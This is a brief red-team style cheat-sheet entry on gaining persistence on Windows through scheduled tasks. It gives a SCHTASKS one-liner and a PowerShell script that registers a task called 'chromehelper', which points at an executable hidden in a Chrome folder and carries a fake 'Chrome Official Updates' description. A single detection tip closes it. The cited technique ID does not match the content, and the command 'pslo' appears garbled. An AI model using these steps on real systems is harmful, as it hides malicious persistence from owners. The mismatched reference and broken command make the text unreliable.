# [Login item](https://attack.mitre.org/techniques/T1547/015/)

## Exploit syntax:

* SCHTASKS /CREATE /SC ONLOGON /TN "MyTasks\Notepad task" /TR "Path to the executable you want to run" /ST 11:00

1. Create ps1 file and input the following:

    ```powershell   

    # Here outpath is the location that your persistent file is. 
    
    $outpath = "C:\Program Files (x86)\Google\Chrome\Application\44.0.2403.155\chromehelper.exe"

    $action = New-ScheduledTaskAction -Execute $outpath

    $days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'

    $trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 9am
    Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "chromehelper" -Description "This task grabs Chrome Official Updates."

    ```

2. Execute the following command:

    ```powershell

    pslo <name of the above codeblock>.ps1 

    ```


## Detection Technique
* Investigate file creation in the default windows task folder - C:\Windows\System32\Tasks folder.
